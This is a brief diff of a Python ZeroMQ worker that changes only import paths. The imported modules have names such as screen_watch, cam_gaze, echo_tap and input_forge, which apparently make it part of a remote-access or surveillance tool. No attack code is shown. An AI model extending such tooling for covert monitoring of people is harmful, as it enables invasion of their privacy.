@@ -3,15 +3,15 @@ import json
 import zmq
 import zmq.asyncio
 import multiprocessing
-from LoggerWrapper import Log as logger
-from Config import *
+from logs import Log as logger
+from backend import ZMQ_PUSH_PULL_ADDR
 
 async def worker_task(worker_id: str):
     zmq_ctx = zmq.asyncio.Context()
     pull_socket = zmq_ctx.socket(zmq.PULL)
     pull_socket.connect(ZMQ_PUSH_PULL_ADDR)
 
-    from Modules import module_map, data_scribe, screen_watch, bin_stream, echo_tap, cam_gaze, input_forge
+    from backend.Modules import module_map, data_scribe, screen_watch, bin_stream, echo_tap, cam_gaze, input_forge
 
     logger.info(f"[+] Worker {worker_id} started and connected to {ZMQ_PUSH_PULL_ADDR}")
 
